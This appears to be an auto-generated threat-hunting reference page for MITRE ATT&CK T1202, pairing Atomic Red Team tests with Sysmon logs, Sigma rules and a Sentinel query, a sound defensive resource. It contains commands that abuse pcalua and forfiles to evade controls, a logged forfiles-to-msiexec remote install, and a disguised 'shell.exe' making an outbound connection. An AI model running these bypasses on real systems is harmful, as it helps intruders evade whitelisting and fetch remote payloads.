
# Indirect Command Execution

## Description

### MITRE Description

> Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command-Line Interface](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)

Adversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.

## Additional Attributes

* Bypass: ['Static File Analysis', 'Application whitelisting', 'Process whitelisting', 'Whitelisting by file name or path']
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1202

## Potential Commands

```
pcalua.exe -a calc.exe
pcalua.exe -a #{payload_path}

pcalua.exe -a #{process}
pcalua.exe -a C:\Windows\System32\calc.exe

forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe"

pcalua.exe
Log
#sysmon log
EventID: 1
Process Create:
RuleName:
UtcTime: 2020-04-18 16: 27: 08.447
ProcessGuid: {bb1f7c32-2a5c-5e9b-0000-0010b3101d00}
ProcessId: 588
Image: C: \ Windows \ System32 \ msiexec.exe
FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows installer
Product: Windows Installer - Unicode
Company: Microsoft Corporation
OriginalFileName: msiexec.exe
CommandLine: / q / i http://192.168.126.146/abc.txt
CurrentDirectory: C: \ Windows \ system32 \
User: 12306Br0-PC \ 12306Br0
LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020b86d0600}
LogonId: 0x66db8
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD
ParentProcessGuid: {bb1f7c32-2a5c-5e9b-0000-00100a101d00}
ParentProcessId: 1220
ParentImage: C: \ Windows \ System32 \ forfiles.exe
ParentCommandLine: forfiles / p c: \ windows \ system32 / m cmd.exe / c "msiexec.exe / q / i http://192.168.126.146/abc.txt"


# Win7 security log
EventID: 4688
Process information:
New Process ID: 0x4c4
New Process Name: C: \ Windows \ System32 \ forfiles.exe
Log
#sysmon log
EventID: 1
Process Create:
RuleName:
UtcTime: 2020-04-18 16: 12: 37.744
ProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00}
ProcessId: 2148
Image: C: \ Windows \ System32 \ pcalua.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Program Compatibility Assistant
Product: Microsoft Windows Operating System
Company: Microsoft Corporation
OriginalFileName:
CommandLine: Pcalua -m -a C: \ Users \ 12306Br0 \ Desktop \ a \ shell.exe
CurrentDirectory: C: \ Users \ 12306Br0 \
User: 12306Br0-PC \ 12306Br0
LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600}
LogonId: 0x66ddb
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1 = 280038828C2412F3867DDB22E07759CB26F7D8EA
ParentProcessGuid: {bb1f7c32-26ca-5e9b-0000-00109cdf0d00}
ParentProcessId: 2724
ParentImage: C: \ Windows \ System32 \ cmd.exe
ParentCommandLine: "C: \ Windows \ system32 \ cmd.exe"

EventID: 1
Process Create:
RuleName:
UtcTime: 2020-04-18 16: 12: 37.775
ProcessGuid: {bb1f7c32-26f5-5e9b-0000-0010621a0e00}
ProcessId: 2804
Image: C: \ Users \ 12306Br0 \ Desktop \ a \ shell.exe
FileVersion: 2.2.14
Description: ApacheBench command line utility
Product: Apache HTTP Server
Company: Apache Software Foundation
OriginalFileName: ab.exe
CommandLine: "C: \ Users \ 12306Br0 \ Desktop \ a \ shell.exe"
CurrentDirectory: C: \ Users \ 12306Br0 \
User: 12306Br0-PC \ 12306Br0
LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600}
LogonId: 0x66ddb
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1 = C11C194CA5D0570F1BC85BB012F145BAFC9A4D6C
ParentProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00}
ParentProcessId: 2148
ParentImage: C: \ Windows \ System32 \ pcalua.exe
ParentCommandLine: Pcalua -m -a C: \ Users \ 12306Br0 \ Desktop \ a \ shell.exe

# Win7 security log
EventID: 4688
Process information:
New Process ID: 0x864
New Process Name: C: \ Windows \ System32 \ pcalua.exe

EventID: 4688
Process information:
New Process ID: 0xaf4
New Process Name: C: \ Users \ 12306Br0 \ Desktop \ a \ shell.exe

EventID: 5156
Application Information:
Process ID: 2804
Application Name: \ device \ harddiskvolume2 \ users \ 12306br0 \ desktop \ a \ shell.exe

Internet Information:
Direction: Outbound
Source address: 192.168.126.149
Source Port: 49163
Destination address: 192.168.126.146
Destination Port: 6666
```

## Commands Dataset

```
[{'command': 'pcalua.exe -a calc.exe\npcalua.exe -a #{payload_path}\n',
  'name': None,
  'source': 'atomics/T1202/T1202.yaml'},
 {'command': 'pcalua.exe -a #{process}\n'
             'pcalua.exe -a C:\\Windows\\System32\\calc.exe\n',
  'name': None,
  'source': 'atomics/T1202/T1202.yaml'},
 {'command': 'forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe\n'
             'forfiles /p c:\\windows\\system32 /m notepad.exe /c '
             '"c:\\folder\\normal.dll:evil.exe"\n',
  'name': None,
  'source': 'atomics/T1202/T1202.yaml'},
 {'command': 'pcalua.exe',
  'name': None,
  'source': 'SysmonHunter - Indirect Command Execution'},
 {'command': 'Log\n'
             '#sysmon log\n'
             'EventID: 1\n'
             'Process Create:\n'
             'RuleName:\n'
             'UtcTime: 2020-04-18 16: 27: 08.447\n'
             'ProcessGuid: {bb1f7c32-2a5c-5e9b-0000-0010b3101d00}\n'
             'ProcessId: 588\n'
             'Image: C: \\ Windows \\ System32 \\ msiexec.exe\n'
             'FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\n'
             'Description: Windows installer\n'
             'Product: Windows Installer - Unicode\n'
             'Company: Microsoft Corporation\n'
             'OriginalFileName: msiexec.exe\n'
             'CommandLine: / q / i http://192.168.126.146/abc.txt\n'
             'CurrentDirectory: C: \\ Windows \\ system32 \\\n'
             'User: 12306Br0-PC \\ 12306Br0\n'
             'LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020b86d0600}\n'
             'LogonId: 0x66db8\n'
             'TerminalSessionId: 1\n'
             'IntegrityLevel: High\n'
             'Hashes: SHA1 = 443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\n'
             'ParentProcessGuid: {bb1f7c32-2a5c-5e9b-0000-00100a101d00}\n'
             'ParentProcessId: 1220\n'
             'ParentImage: C: \\ Windows \\ System32 \\ forfiles.exe\n'
             'ParentCommandLine: forfiles / p c: \\ windows \\ system32 / m '
             'cmd.exe / c "msiexec.exe / q / i '
             'http://192.168.126.146/abc.txt"\n'
             '\n'
             '\n'
             '# Win7 security log\n'
             'EventID: 4688\n'
             'Process information:\n'
             'New Process ID: 0x4c4\n'
             'New Process Name: C: \\ Windows \\ System32 \\ forfiles.exe',
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'Log\n'
             '#sysmon log\n'
             'EventID: 1\n'
             'Process Create:\n'
             'RuleName:\n'
             'UtcTime: 2020-04-18 16: 12: 37.744\n'
             'ProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00}\n'
             'ProcessId: 2148\n'
             'Image: C: \\ Windows \\ System32 \\ pcalua.exe\n'
             'FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n'
             'Description: Program Compatibility Assistant\n'
             'Product: Microsoft Windows Operating System\n'
             'Company: Microsoft Corporation\n'
             'OriginalFileName:\n'
             'CommandLine: Pcalua -m -a C: \\ Users \\ 12306Br0 \\ Desktop \\ '
             'a \\ shell.exe\n'
             'CurrentDirectory: C: \\ Users \\ 12306Br0 \\\n'
             'User: 12306Br0-PC \\ 12306Br0\n'
             'LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600}\n'
             'LogonId: 0x66ddb\n'
             'TerminalSessionId: 1\n'
             'IntegrityLevel: Medium\n'
             'Hashes: SHA1 = 280038828C2412F3867DDB22E07759CB26F7D8EA\n'
             'ParentProcessGuid: {bb1f7c32-26ca-5e9b-0000-00109cdf0d00}\n'
             'ParentProcessId: 2724\n'
             'ParentImage: C: \\ Windows \\ System32 \\ cmd.exe\n'
             'ParentCommandLine: "C: \\ Windows \\ system32 \\ cmd.exe"\n'
             '\n'
             'EventID: 1\n'
             'Process Create:\n'
             'RuleName:\n'
             'UtcTime: 2020-04-18 16: 12: 37.775\n'
             'ProcessGuid: {bb1f7c32-26f5-5e9b-0000-0010621a0e00}\n'
             'ProcessId: 2804\n'
             'Image: C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ shell.exe\n'
             'FileVersion: 2.2.14\n'
             'Description: ApacheBench command line utility\n'
             'Product: Apache HTTP Server\n'
             'Company: Apache Software Foundation\n'
             'OriginalFileName: ab.exe\n'
             'CommandLine: "C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ '
             'shell.exe"\n'
             'CurrentDirectory: C: \\ Users \\ 12306Br0 \\\n'
             'User: 12306Br0-PC \\ 12306Br0\n'
             'LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600}\n'
             'LogonId: 0x66ddb\n'
             'TerminalSessionId: 1\n'
             'IntegrityLevel: Medium\n'
             'Hashes: SHA1 = C11C194CA5D0570F1BC85BB012F145BAFC9A4D6C\n'
             'ParentProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00}\n'
             'ParentProcessId: 2148\n'
             'ParentImage: C: \\ Windows \\ System32 \\ pcalua.exe\n'
             'ParentCommandLine: Pcalua -m -a C: \\ Users \\ 12306Br0 \\ '
             'Desktop \\ a \\ shell.exe\n'
             '\n'
             '# Win7 security log\n'
             'EventID: 4688\n'
             'Process information:\n'
             'New Process ID: 0x864\n'
             'New Process Name: C: \\ Windows \\ System32 \\ pcalua.exe\n'
             '\n'
             'EventID: 4688\n'
             'Process information:\n'
             'New Process ID: 0xaf4\n'
             'New Process Name: C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ '
             'shell.exe\n'
             '\n'
             'EventID: 5156\n'
             'Application Information:\n'
             'Process ID: 2804\n'
             'Application Name: \\ device \\ harddiskvolume2 \\ users \\ '
             '12306br0 \\ desktop \\ a \\ shell.exe\n'
             '\n'
             'Internet Information:\n'
             'Direction: Outbound\n'
             'Source address: 192.168.126.149\n'
             'Source Port: 49163\n'
             'Destination address: 192.168.126.146\n'
             'Destination Port: 6666',
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Michael Haag, Florian Roth, Markus Neis',
                  'date': '2018/04/06',
                  'description': 'Detects a Windows command line executable '
                                 'started from Microsoft Word, Excel, '
                                 'Powerpoint, Publisher and Visio.',
                  'detection': {'condition': 'selection',
                                'selection': {'Image': ['*\\cmd.exe',
                                                        '*\\powershell.exe',
                                                        '*\\wscript.exe',
                                                        '*\\cscript.exe',
                                                        '*\\sh.exe',
                                                        '*\\bash.exe',
                                                        '*\\scrcons.exe',
                                                        '*\\schtasks.exe',
                                                        '*\\regsvr32.exe',
                                                        '*\\hh.exe',
                                                        '*\\wmic.exe',
                                                        '*\\mshta.exe',
                                                        '*\\rundll32.exe',
                                                        '*\\msiexec.exe',
                                                        '*\\forfiles.exe',
                                                        '*\\scriptrunner.exe',
                                                        '*\\mftrace.exe',
                                                        '*\\AppVLP.exe',
                                                        '*\\svchost.exe'],
                                              'ParentImage': ['*\\WINWORD.EXE',
                                                              '*\\EXCEL.EXE',
                                                              '*\\POWERPNT.exe',
                                                              '*\\MSPUB.exe',
                                                              '*\\VISIO.exe',
                                                              '*\\OUTLOOK.EXE']}},
                  'falsepositives': ['unknown'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': '438025f9-5856-4663-83f7-52f878a70a50',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100',
                                 'https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.defense_evasion',
                           'attack.t1059',
                           'attack.t1202',
                           'car.2013-02-003',
                           'car.2014-04-003'],
                  'title': 'Microsoft Office Product Spawning Windows Shell'}},
 {'data_source': {'author': 'Jason Lynch',
                  'date': '2019/04/02',
                  'description': 'Detects an executable in the users directory '
                                 'started from Microsoft Word, Excel, '
                                 'Powerpoint, Publisher or Visio',
                  'detection': {'condition': 'selection',
                                'selection': {'Image': ['C:\\users\\\\*.exe'],
                                              'ParentImage': ['*\\WINWORD.EXE',
                                                              '*\\EXCEL.EXE',
                                                              '*\\POWERPNT.exe',
                                                              '*\\MSPUB.exe',
                                                              '*\\VISIO.exe',
                                                              '*\\OUTLOOK.EXE']}},
                  'falsepositives': ['unknown'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': 'aa3a6f94-890e-4e22-b634-ffdfd54792cc',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['sha256=23160972c6ae07f740800fa28e421a81d7c0ca5d5cab95bc082b4a986fbac57c',
                                 'https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.defense_evasion',
                           'attack.t1059',
                           'attack.t1202',
                           'FIN7',
                           'car.2013-05-002'],
                  'title': 'MS Office Product Spawning Exe in User Dir'}},
 {'data_source': {'author': 'Markus Neis',
                  'date': '2018/12/27',
                  'description': 'Detects EnableUnsafeClientMailRules used for '
                                 'Script Execution from Outlook',
                  'detection': {'clientMailRules': {'CommandLine': '*EnableUnsafeClientMailRules*'},
                                'condition': 'clientMailRules or outlookExec',
                                'outlookExec': {'CommandLine': '\\\\\\\\*\\\\*.exe',
                                                'ParentImage': '*\\outlook.exe'}},
                  'falsepositives': ['unknown'],
                  'id': 'e212d415-0e93-435f-9e1a-f29005bb4723',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://github.com/sensepost/ruler',
                                 'https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1059', 'attack.t1202'],
                  'title': 'Suspicious Execution from Outlook'}}]
```

## Potential Queries

```json
[{'name': 'Indirect Command Execution',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_parent_command_line '
           'contains "pcalua.exe"or process_path contains "pcalua.exe"or '
           'process_path contains "bash.exe"or process_path contains '
           '"forfiles.exe")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Indirect Command Execution': {'atomic_tests': [{'description': 'The '
                                                                                         'Program '
                                                                                         'Compatibility '
                                                                                         'Assistant '
                                                                                         '(pcalua.exe) '
                                                                                         'may '
                                                                                         'invoke '
                                                                                         'the '
                                                                                         'execution '
                                                                                         'of '
                                                                                         'programs '
                                                                                         'and '
                                                                                         'commands '
                                                                                         'from '
                                                                                         'a '
                                                                                         'Command-Line '
                                                                                         'Interface.\n'
                                                                                         '[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)\n'
                                                                                         'Upon '
                                                                                         'execution, '
                                                                                         'calc.exe '
                                                                                         'should '
                                                                                         'open\n',
                                                                          'executor': {'command': 'pcalua.exe '
                                                                                                  '-a '
                                                                                                  '#{process}\n'
                                                                                                  'pcalua.exe '
                                                                                                  '-a '
                                                                                                  '#{payload_path}\n',
                                                                                       'elevation_required': False,
                                                                                       'name': 'command_prompt'},
                                                                          'input_arguments': {'payload_path': {'default': 'C:\\Windows\\System32\\calc.exe',
                                                                                                               'description': 'Path '
                                                                                                                              'to '
                                                                                                                              'payload',
                                                                                                               'type': 'path'},
                                                                                              'process': {'default': 'calc.exe',
                                                                                                          'description': 'Process '
                                                                                                                         'to '
                                                                                                                         'execute',
                                                                                                          'type': 'string'}},
                                                                          'name': 'Indirect '
                                                                                  'Command '
                                                                                  'Execution '
                                                                                  '- '
                                                                                  'pcalua.exe',
                                                                          'supported_platforms': ['windows']},
                                                                         {'description': 'forfiles.exe '
                                                                                         'may '
                                                                                         'invoke '
                                                                                         'the '
                                                                                         'execution '
                                                                                         'of '
                                                                                         'programs '
                                                                                         'and '
                                                                                         'commands '
                                                                                         'from '
                                                                                         'a '
                                                                                         'Command-Line '
                                                                                         'Interface.\n'
                                                                                         '[Reference](https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Forfiles.md)\n'
                                                                                         '"This '
                                                                                         'is '
                                                                                         'basically '
                                                                                         'saying '
                                                                                         'for '
                                                                                         'each '
                                                                                         'occurrence '
                                                                                         'of '
                                                                                         'notepad.exe '
                                                                                         'in '
                                                                                         'c:\\windows\\system32 '
                                                                                         'run '
                                                                                         'calc.exe"\n'
                                                                                         'Upon '
                                                                                         'execution '
                                                                                         'calc.exe '
                                                                                         'will '
                                                                                         'be '
                                                                                         'opened\n',
                                                                          'executor': {'command': 'forfiles '
                                                                                                  '/p '
                                                                                                  'c:\\windows\\system32 '
                                                                                                  '/m '
                                                                                                  'notepad.exe '
                                                                                                  '/c '
                                                                                                  '#{process}\n'
                                                                                                  'forfiles '
                                                                                                  '/p '
                                                                                                  'c:\\windows\\system32 '
                                                                                                  '/m '
                                                                                                  'notepad.exe '
                                                                                                  '/c '
                                                                                                  '"c:\\folder\\normal.dll:evil.exe"\n',
                                                                                       'elevation_required': False,
                                                                                       'name': 'command_prompt'},
                                                                          'input_arguments': {'process': {'default': 'calc.exe',
                                                                                                          'description': 'Process '
                                                                                                                         'to '
                                                                                                                         'execute',
                                                                                                          'type': 'string'}},
                                                                          'name': 'Indirect '
                                                                                  'Command '
                                                                                  'Execution '
                                                                                  '- '
                                                                                  'forfiles.exe',
                                                                          'supported_platforms': ['windows']}],
                                                        'attack_technique': 'T1202',
                                                        'display_name': 'Indirect '
                                                                        'Command '
                                                                        'Execution'}},
 {'SysmonHunter - T1202': {'description': None,
                           'level': 'medium',
                           'name': 'Indirect Command Execution',
                           'phase': 'Execution',
                           'query': [{'process': {'any': {'pattern': 'pcalua.exe'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations

None

# Actors

None
